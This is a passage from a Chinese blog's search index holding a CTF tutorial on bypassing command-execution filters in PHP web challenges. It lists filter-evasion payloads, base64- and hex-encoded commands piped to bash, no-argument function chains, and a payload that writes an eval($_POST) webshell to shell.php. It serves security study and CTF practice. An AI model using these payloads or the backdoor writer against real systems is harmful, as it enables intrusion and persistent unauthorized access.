<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ctf-RCEbypass简单总结</title>
    <link href="/2022/09/12/ctf-RCEbypass%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/"/>
    <url>/2022/09/12/ctf-RCEbypass%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="php命令执行函数"><a href="#php命令执行函数" class="headerlink" title="php命令执行函数"></a>php命令执行函数</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">passthru</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">shell_exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">popen</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">proc_open</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">pcntl_exec</span><span class="hljs-params">()</span></span><br>反引号`` 同<span class="hljs-built_in">shell_exec</span>() <br></code></pre></td></tr></table></figure><h3 id="管道符与元字符"><a href="#管道符与元字符" class="headerlink" title="管道符与元字符"></a>管道符与元字符</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">CR</span>：回车键&lt;ennter&gt;<br>=：设定变量<br><span class="hljs-variable">$：</span>作变量或运算替换<br>&gt;：重定向标准输入<br>&lt;：重定向标准输出<br>[<span class="hljs-symbol">:alnum</span><span class="hljs-symbol">:</span>]任意数字或者字母<br>[<span class="hljs-symbol">:alpha</span><span class="hljs-symbol">:</span>]任意字母<br>[<span class="hljs-symbol">:space</span><span class="hljs-symbol">:</span>]空格<br>[<span class="hljs-symbol">:lower</span><span class="hljs-symbol">:</span>]小写字母<br>[<span class="hljs-symbol">:digit</span><span class="hljs-symbol">:</span>]任意数字<br>[<span class="hljs-symbol">:upper</span><span class="hljs-symbol">:</span>]任意大写字母<br>[<span class="hljs-symbol">:cntrl</span><span class="hljs-symbol">:</span>]控制符<br>[<span class="hljs-symbol">:graph</span><span class="hljs-symbol">:</span>]图形<br>[<span class="hljs-symbol">:print</span><span class="hljs-symbol">:</span>]可打印字符<br>[<span class="hljs-symbol">:punct</span><span class="hljs-symbol">:</span>]标点符号<br>[<span class="hljs-symbol">:xdigit</span><span class="hljs-symbol">:</span>]十六进制数<br>[<span class="hljs-symbol">:blank</span><span class="hljs-symbol">:</span>]空白字符<br><br>|：命令管道<br>&amp;：重导向文件描述符，或将命令静默执行  <span class="hljs-comment">#例如 java -jar test.jar&amp;代表后台运行</span><br>||：前面的命令执行错误就执行后面的语句，否则只执行前面的语句<br>&amp;&amp;：前面的命令执行正确就执行后面的语句，否则只执行前面的语句<br>;：忽略前一个命令的返回值，继续执行下一条指令<br></code></pre></td></tr></table></figure><h3 id="空格的替换"><a href="#空格的替换" class="headerlink" title="空格的替换"></a>空格的替换</h3><h4 id="常规替换"><a href="#常规替换" class="headerlink" title="常规替换"></a>常规替换</h4><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt;<br>&lt;&gt;<br>$IFS<br>$&#123;IFS&#125;<br>$IFS$(<span class="hljs-number">1</span><span class="hljs-number">-9</span>)  #从<span class="hljs-number">1</span>到<span class="hljs-number">9</span>，可以进行fuzz<br>&#123;cat,flag.txt&#125; <span class="hljs-comment">//花括号连接执行</span><br>%09<br>%20<br></code></pre></td></tr></table></figure><h4 id="u的妙用"><a href="#u的妙用" class="headerlink" title="$u的妙用"></a>$u的妙用</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-variable">$u</span>在Linux中代表的是空字符串(未初始化变量)，并不是代表是空格，我们可以将其随意插入到命令中，比如<br>c<span class="hljs-variable">$&#123;u&#125;</span>at index<span class="hljs-variable">$u</span>.php<span class="hljs-variable">$u</span><br>c`<span class="hljs-variable">$u</span>`at index<span class="hljs-variable">$u</span>.php<span class="hljs-variable">$u</span><br></code></pre></td></tr></table></figure><h4 id="命令提示符-绕过"><a href="#命令提示符-绕过" class="headerlink" title="命令提示符$绕过"></a>命令提示符$绕过</h4> <figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$*</span>、<span class="hljs-variable">$@</span>、<span class="hljs-variable">$x</span>（x=<span class="hljs-number">1</span>~<span class="hljs-number">9</span>）、<span class="hljs-variable">$&#123;</span>x&#125;（x&gt;<span class="hljs-number">9</span>)<br>在没有传参时，这些值都为空（<span class="hljs-variable">$0</span>表示shell本身的文件名，不可用）<br>例如：<br>ca<span class="hljs-variable">$*</span>t flag<br>ca<span class="hljs-variable">$@</span>t flag<br>ca<span class="hljs-variable">$7t</span> flag<br>ca<span class="hljs-variable">$&#123;</span><span class="hljs-number">18</span>&#125;t flag <br></code></pre></td></tr></table></figure><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stata">?：匹配一个字符#<span class="hljs-keyword">cat</span> <span class="hljs-keyword">fl</span>??<br><br><span class="hljs-comment">*：匹配一个或多个任意字符#cat fl*</span><br><br>[<span class="hljs-keyword">list</span>]：匹配<span class="hljs-keyword">list</span>内的任意单个字符#<span class="hljs-keyword">cat</span> <span class="hljs-keyword">fl</span>[a]<span class="hljs-keyword">g</span>   例如[@-[]可以表示大写字母<br><br>[!<span class="hljs-keyword">list</span>] or [ ^<span class="hljs-keyword">list</span>]：匹配<span class="hljs-keyword">list</span>外的任意单个字符#<span class="hljs-keyword">cat</span> fla[s]<br><br>&#123;s1,s2,s3,...&#125;：匹配s1，s2，s3或者其它更多字符#<span class="hljs-keyword">cat</span> <span class="hljs-keyword">fl</span>&#123;a,b&#125;<span class="hljs-keyword">g</span><br><br><br><span class="hljs-comment">//用通配符匹配tmp目录下的临时session文件</span><br><span class="hljs-keyword">file</span>=/???/????????[@-[]<br></code></pre></td></tr></table></figure><h3 id="可插入字符"><a href="#可插入字符" class="headerlink" title="可插入字符"></a>可插入字符</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mel">l&lt;s<br>l&lt;&gt;s<br>ca<span class="hljs-string">&quot;&quot;</span>t<br>ca<span class="hljs-string">&#x27;&#x27;</span>t<br>ca<span class="hljs-string">``</span>t<br>ca\t<br>a=c;b=at;$a$b xxx.php    # 变量拼接<br>c$&#123;u&#125;at                  # 因为c$uat 系统不知道你要执行的是$u还是$uat，因此加上界定符，命令成功运行<br>l<span class="hljs-string">`$u`</span>s<br>wh$1oami<br>who$@ami<br>whoa$*mi<br></code></pre></td></tr></table></figure><h3 id="bash读取文件命令"><a href="#bash读取文件命令" class="headerlink" title="bash读取文件命令"></a>bash读取文件命令</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sqf">cat <span class="hljs-built_in">flag</span><span class="hljs-comment">// 正序输出所有内容</span><br>tac <span class="hljs-built_in">flag</span><span class="hljs-comment">// 从最后一行开始倒序输出所有内容</span><br>php <span class="hljs-built_in">flag</span><span class="hljs-comment">// php读取</span><br>head <span class="hljs-built_in">flag</span><span class="hljs-comment">// 读文件前若干行（需要加参数 -n）</span><br>tail <span class="hljs-built_in">flag</span><span class="hljs-comment">// 读文件后若干行（需要加参数 -n）</span><br>more <span class="hljs-built_in">flag</span><span class="hljs-comment">// 按页读文件</span><br>less <span class="hljs-built_in">flag</span><span class="hljs-comment">// 好像和more差不多</span><br>nl <span class="hljs-built_in">flag</span><span class="hljs-comment">// 读文件顺便显示行号</span><br>od <span class="hljs-built_in">flag</span><span class="hljs-comment">// 一般用od -c flag</span><br>file -f <span class="hljs-built_in">flag</span><span class="hljs-comment">// 利用file报错出flag</span><br><span class="hljs-built_in">sort</span> <span class="hljs-built_in">flag</span><span class="hljs-comment">// 按首列ascii排序后输出</span><br>uniq <span class="hljs-built_in">flag</span><span class="hljs-comment">// 删除重复出现的行列</span><br>paste <span class="hljs-built_in">flag</span><span class="hljs-comment">// 合并文件的行列并输出</span><br>diff <span class="hljs-built_in">flag</span> file<span class="hljs-comment">// 对比flag和file的不同</span><br>bzmore <span class="hljs-built_in">flag</span><span class="hljs-comment">// 将bzip压缩过的文件解压后输出</span><br>bzless <span class="hljs-built_in">flag</span><span class="hljs-comment">// bzmore增强版</span><br>curl file:<span class="hljs-comment">///flag// file协议读</span><br>sed -n <span class="hljs-string">&#x27;1,2p&#x27;</span> <span class="hljs-built_in">flag</span><span class="hljs-comment">// 1，2表示显示1~2行，可以不要</span><br>strings <span class="hljs-comment">//字符串形式查看文件</span><br>grep  <span class="hljs-comment">//例如 grep test *php strings 表示查找并打印出以php为后缀的文件中包含字符串test的行</span><br></code></pre></td></tr></table></figure><h3 id="php文件读取函数"><a href="#php文件读取函数" class="headerlink" title="php文件读取函数"></a>php文件读取函数</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mel">#通过单一函数读取文件<br>c=echo file_get_contents(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>c=readfile(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>c=var_dump(<span class="hljs-keyword">file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>));<br>c=print_r(<span class="hljs-keyword">file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>));<br>#这里做一个解释<span class="hljs-string">`file — 把整个文件读入一个数组中`</span><br>#通过<span class="hljs-keyword">fopen</span>去读取文件内容，这里介绍下函数<br><span class="hljs-keyword">fread</span>()<br>fgets()<br>fgetc()<br>fgetss()<br>fgetcsv()<br>gpassthru()<br><br>一些payload:<br>c=$a=<span class="hljs-keyword">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-keyword">feof</span>($a)) &#123;$line = fgets($a);echo $line;&#125;#一行一行读取<br>c=$a=<span class="hljs-keyword">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-keyword">feof</span>($a)) &#123;$line = fgetc($a);echo $line;&#125;#一个一个字符读取<br>c=$a=<span class="hljs-keyword">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-keyword">feof</span>($a)) &#123;$line = fgetcsv($a);var_dump($line);&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">payload1:c=system(<span class="hljs-string">&quot;nl fla?????&quot;</span>);<br>payload2:c=system(<span class="hljs-string">&quot;nl fla*&quot;</span>);<br>payload3:c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> fl<span class="hljs-string">&#x27;&#x27;</span>ag.php`;    或者c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> fl“”ag.php`;<br>payload4:c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> fl\ag.php`;    <span class="hljs-comment">#转义字符绕过</span><br>payload5:c=include(<span class="hljs-variable">$_GET</span>[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<br>payload6:c=<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_GET</span>[1]);&amp;1=system(<span class="hljs-string">&#x27;nl flag.php&#x27;</span>);<br>payload7:c=awk <span class="hljs-string">&#x27;&#123;printf $0&#125;&#x27;</span> flag.php||<br></code></pre></td></tr></table></figure><h2 id="Bypass技巧"><a href="#Bypass技巧" class="headerlink" title="Bypass技巧"></a>Bypass技巧</h2><h3 id="1-bash进制转换、编码"><a href="#1-bash进制转换、编码" class="headerlink" title="1.bash进制转换、编码"></a>1.bash进制转换、编码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">//16进制编码、解码<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cat flag&quot;</span>|xxd -p   <span class="hljs-comment"># encode</span><br>63617420666c61670a<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;63617420666c61670a&quot;</span>|xxd -r -p   <span class="hljs-comment"># decode</span><br><span class="hljs-built_in">cat</span> flag<br><br>//8进制执行<br>$(<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\154\163&quot;</span>)  <span class="hljs-comment">#ls</span><br><br>//base64编码、解码<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cat flag&quot;</span> | <span class="hljs-built_in">base64</span>  <span class="hljs-comment"># encode</span><br>Y2F0IGZsYWcK<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWcK&quot;</span> | <span class="hljs-built_in">base64</span> -d  <span class="hljs-comment"># decode</span><br><span class="hljs-built_in">cat</span> flag<br><br>`<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Y2F0Cg==&#x27;</span> | <span class="hljs-built_in">base64</span> -d` flag.txt     <span class="hljs-comment"># &quot;Y2F0Cg==&quot; 解码后是cat</span><br><br></code></pre></td></tr></table></figure><p>如果加上直接执行的话就是</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">16进制：echo <span class="hljs-variable">&lt;hexString&gt;</span>|<span class="hljs-string">xxd -r -p</span>|bash<br>base64：echo <span class="hljs-variable">&lt;base64String&gt;</span>|<span class="hljs-string">base64 -d</span>|bash<br></code></pre></td></tr></table></figure><h3 id="2-bash内联执行"><a href="#2-bash内联执行" class="headerlink" title="2.bash内联执行"></a>2.bash内联执行</h3><p>将输出作为输入执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//$() 代表执行括号中语句的执行结果，反引号类似。</span><br><br>$(<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;cat flag&#x27;</span>)<br><br>`<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;cat flag&#x27;</span>`<br></code></pre></td></tr></table></figure><h3 id="3-bin目录"><a href="#3-bin目录" class="headerlink" title="3.bin目录"></a>3.bin目录</h3><p>bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。<br>例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>?at<span class="hljs-variable">$&#123;IFS&#125;</span>f???????  <span class="hljs-comment">#cat flag.php</span><br><span class="hljs-regexp">/bin/</span>base64<br></code></pre></td></tr></table></figure><h3 id="3-cp-mv-改文件名"><a href="#3-cp-mv-改文件名" class="headerlink" title="3.cp mv 改文件名"></a>3.cp mv 改文件名</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp fla?.php <span class="hljs-number">1</span>.txt<br>mv fla?.php <span class="hljs-number">1</span>.txt<br><span class="hljs-regexp">//</span>另外使用php函数也可以改文件名<br>c=rename(<span class="hljs-string">&#x27;flag.php&#x27;</span>,<span class="hljs-string">&#x27;1.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><p>然后访问1.txt</p><h3 id="4-文件包含二次传参"><a href="#4-文件包含二次传参" class="headerlink" title="4.文件包含二次传参"></a>4.文件包含二次传参</h3><p>可以使用include、require来构造文件包含读文件。</p><p>%0a用于换行绕过，另外<strong>include可以不使用()使用?&gt;闭合。</strong></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php //伪协议读</span><br><span class="language-xml">c=include$_GET[1]?&gt;&amp;1=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat flag.php&quot;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">   //写文件</span><br><span class="language-xml">c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg== //base64写文件</span><br><span class="language-xml">c=include$_GET[1]?&gt;&amp;1=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&quot;&lt;?php eval(\$_POST[&#x27;hack&#x27;]);?&gt;&quot;</span>)<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> //写后门</span><br><span class="language-xml"></span><br><span class="language-xml">//require和include一样</span><br><span class="language-xml">c=require%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><h3 id="5-短标签"><a href="#5-短标签" class="headerlink" title="5.短标签"></a>5.短标签</h3><p>写shell bypass较常用。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">//</span><span class="language-php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-meta">?&gt;</span></span><span class="language-xml"> :短标签,相当于</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-meta">?&gt;</span></span><span class="language-xml"> ,也可以写成</span><span class="language-php"><span class="hljs-meta">&lt;?</span> <span class="hljs-meta">?&gt;</span></span><span class="language-xml"> 例如：</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?</span><span class="hljs-keyword">echo</span>%<span class="hljs-number">09</span>`cat%<span class="hljs-number">09</span>/flag`<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="6-无参函数绕过"><a href="#6-无参函数绕过" class="headerlink" title="6.无参函数绕过"></a>6.无参函数绕过</h3><p><a href="https://www.cnblogs.com/pursue-security/p/15406272.html">https://www.cnblogs.com/pursue-security/p/15406272.html</a></p><p><a href="https://blog.csdn.net/weixin_46330722/article/details/110840156">https://blog.csdn.net/weixin_46330722/article/details/110840156</a></p><p>有时候会遇到如下类型的过滤：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $_GET[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;    <br>    <span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>])<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>意思就是传入的函数必须是无参执行的，像phpinfo()之类。</p><p>我们绕过的思路就是利用php的一些无参函数的返回值，一层层嵌套执行。</p><h4 id="getallheaders-、end-、implode"><a href="#getallheaders-、end-、implode" class="headerlink" title="getallheaders() 、end()、implode()"></a>getallheaders() 、end()、implode()</h4><p><strong>注：此姿势仅限于apache可以使用。</strong></p><p>getallheaders()顾名思义是获取所有请求头信息，并以数组形式返回。</p><p>end()是取数组中最后一个元素值。</p><p>impode是将数组元素连接成为一个字符串。</p><p>用这三个函数我们可以<strong>提取请求头参数值来命令执行</strong>。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-comment">//请求头部最后添加 spring : phpinfo();//</span><br><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">end</span>(<span class="hljs-title">getallheaders</span>()))</span><br><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">implode</span>(<span class="hljs-title">getallheaders</span>()))</span><br></code></pre></td></tr></table></figure><h4 id="get-defined-vars-、current-、end"><a href="#get-defined-vars-、current-、end" class="headerlink" title="get_defined_vars() 、current()、end()"></a>get_defined_vars() 、current()、end()</h4><p>这种方式就更通用一些。</p><p>get_defined_vars():获取四个超全局变量GET 、POST、FILES、COOKIE，并以二维数组的形式返回。</p><p>current():可以<strong>将二位数组转换成一维数组</strong>并返回数组中的当前单元；默认是GET中的第一个。</p><p>我们可以使用end(current(get_defined_vars()))获取传递的最后一个GET参数值，然后eval执行</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">end</span>(<span class="hljs-title">current</span>(<span class="hljs-title">get_defined_vars</span>())))&amp;<span class="hljs-variable">spring</span>=<span class="hljs-title">phpinfo</span>();</span><br><span class="hljs-function"><span class="hljs-comment">//spring的值被前面获取到并执行</span></span><br></code></pre></td></tr></table></figure><h4 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h4><p>session_id()函数用于返回当前会话PHPSESSID的值，当然需要先执行session_start()来开启session。</p><p>然后我们在PHPSESSID中写入恶意代码就可以被获取到并执行。</p><p>但要注意PHPSESSID只允许[A-Za-z0-9]，因此我们还要将恶意代码转换成16进制再用hex2bin解码。</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs leaf">赋值PHPSESSID=706870696e666f28293b  <span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">phpinfo</span><span class="hljs-params">()</span></span>;<br>code=eval(hex2bin(session_id(session_start())))<br></code></pre></td></tr></table></figure><h4 id="PHP函数直接读文件"><a href="#PHP函数直接读文件" class="headerlink" title="PHP函数直接读文件"></a>PHP函数直接读文件</h4><p>以一道题目为例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>根据过滤来看前面三种都不能用了，因此要换个思路。</p><blockquote><p>localeconv():返回一个包含本地数字及货币格式信息的数组，重点在于<strong>返回数组第一个元素是 <code> .</code></strong> ，因此我们用current取出<code>.</code>来读取当前目录。</p><p>scandir():列出目录中的文件和目录</p><p>pos():和current()一样输出数组中当前元素的值。</p><p>关于数组操作还有一些函数：</p><ul><li><a href="https://www.php.net/manual/zh/function.end.php">end()</a> - 将数组的内部指针指向最后一个单元</li><li><a href="https://www.php.net/manual/zh/function.key.php">key()</a> - 从关联数组中取得键名</li><li><a 